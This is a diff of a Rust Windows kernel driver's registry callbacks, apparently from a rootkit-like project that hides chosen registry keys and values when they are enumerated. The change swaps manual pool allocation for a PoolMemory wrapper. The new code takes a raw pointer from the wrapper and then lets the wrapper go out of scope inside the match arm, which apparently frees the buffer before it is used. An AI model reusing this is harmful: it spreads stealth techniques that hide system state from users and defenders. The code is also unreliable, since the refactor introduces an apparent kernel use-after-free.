@@ -2,20 +2,24 @@
 
 use {
     super::{
-        utils::{check_key_value, enumerate_value_key, RegistryInfo}, HIDE_KEYS, HIDE_KEY_VALUES, TARGET_KEYS, TARGET_KEY_VALUES
+        utils::{check_key_value, enumerate_value_key, RegistryInfo}, 
+        HIDE_KEYS, HIDE_KEY_VALUES, TARGET_KEYS, TARGET_KEY_VALUES
     }, 
     crate::{
         registry::{utils::{check_key, enumerate_key}, Registry}, 
-        utils::valid_kernel_memory
+        utils::{pool::PoolMemory, valid_kernel_memory}
     }, 
     alloc::{format, string::String}, 
     core::{ffi::c_void, ptr::null_mut}, 
     wdk_sys::{
         ntddk::{
             CmCallbackGetKeyObjectIDEx, CmCallbackReleaseKeyObjectIDEx,
-            ExAllocatePool2, ExFreePool, ObOpenObjectByPointer, ZwClose
-        }, _MODE::KernelMode, _REG_NOTIFY_CLASS::{
-            RegNtPostEnumerateKey, RegNtPostEnumerateValueKey, RegNtPreDeleteKey, RegNtPreDeleteValueKey, RegNtPreQueryKey, RegNtPreSetValueKey
+            ObOpenObjectByPointer, ZwClose
+        }, 
+        _MODE::KernelMode, 
+        _REG_NOTIFY_CLASS::{
+            RegNtPostEnumerateKey, RegNtPostEnumerateValueKey, RegNtPreDeleteKey, 
+            RegNtPreDeleteValueKey, RegNtPreQueryKey, RegNtPreSetValueKey
         }, *
     },
 };
@@ -137,11 +141,14 @@ unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) ->
         return STATUS_SUCCESS;
     }
 
-    let buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) as *mut u8;
-    if buffer.is_null() {
-        ZwClose(key_handle);
-        return STATUS_SUCCESS;
-    }
+    let buffer = match PoolMemory::new(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) {
+        Some(mem) => mem.ptr as *mut u8,
+        None => {
+            log::error!("PoolMemory (Enumerate Key) Failed");
+            ZwClose(key_handle);
+            return STATUS_SUCCESS;
+        }
+    };
 
     let mut result_length = 0;
     let mut counter = 0;
@@ -162,7 +169,6 @@ unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) ->
     }
 
     ZwClose(key_handle);
-    ExFreePool(buffer as _);
     STATUS_SUCCESS
 }
 
@@ -209,11 +215,14 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
         return STATUS_SUCCESS;
     }
 
-    let buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) as *mut u8;
-    if buffer.is_null() {
-        ZwClose(key_handle);
-        return STATUS_SUCCESS;
-    }
+    let buffer = match PoolMemory::new(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) {
+        Some(mem) => mem.ptr as *mut u8,
+        None => {
+            log::error!("PoolMemory (Enumerate Key) Failed");
+            ZwClose(key_handle);
+            return STATUS_SUCCESS;
+        }
+    };
 
     let mut result_length = 0;
     let mut counter = 0;
@@ -236,7 +245,6 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
     }
 
     ZwClose(key_handle);
-    ExFreePool(buffer as _);
     STATUS_SUCCESS
 }
 
